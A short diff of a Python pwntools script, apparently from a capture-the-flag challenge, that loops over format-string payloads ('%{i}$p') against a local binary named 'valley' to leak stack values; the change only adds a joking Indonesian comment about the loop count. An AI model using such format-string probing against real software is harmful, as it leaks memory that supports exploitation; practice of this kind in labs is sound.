@@ -2,7 +2,7 @@ from pwn import *
 
 context.log_level = "error"
 
-for i in range(32):
+for i in range(32): # kenapa pake 32 ?  idk ini lebih ke kebiasaan aja, lagipula biar keren aja 32, kalo kurang naikin ke 64 . jadi kek byte byte gitu wkwkkwkwkw
     pay = f"%{i}$p"
 
     p = process("./valley")
